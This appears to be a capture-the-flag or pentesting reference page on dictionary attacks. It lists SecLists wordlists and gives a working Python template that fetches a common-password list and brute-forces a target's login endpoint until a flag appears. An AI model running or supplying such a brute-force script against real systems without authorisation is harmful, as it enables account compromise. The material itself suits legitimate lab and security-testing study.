# Dictionary Attacks

Quick wordlist reference:

- `rockyou.txt` — millions of leaked passwords, general use
- `top-usernames-shortlist.txt` — fast username attempts
- `xato-net-10-million-usernames.txt` — thorough username brute
- `2023-200_most_used_passwords.txt` — commonly reused, good first pass
- `Default-Credentials/default-passwords.txt` — routers, devices, software defaults

All from SecLists. Tailor to context — gaming org, corp, specific industry — before reaching for rockyou.

When Hydra/Medusa don't fit (custom API endpoint, non-standard response parsing), script it directly. Template — tweak `ip`, `port`, endpoint path, POST field name, and success condition:

```python
import requests

ip = "<TARGET>"
port = <PORT>

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    response = requests.post(f"http://{ip}:{port}/<endpoint>", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Found: {password} | Flag: {response.json()['flag']}")
        break
```

```bash
python3 dictionary-solver.py
```

> [!tip] Check what success actually looks like before looping — wrong condition means you run the full list and miss the hit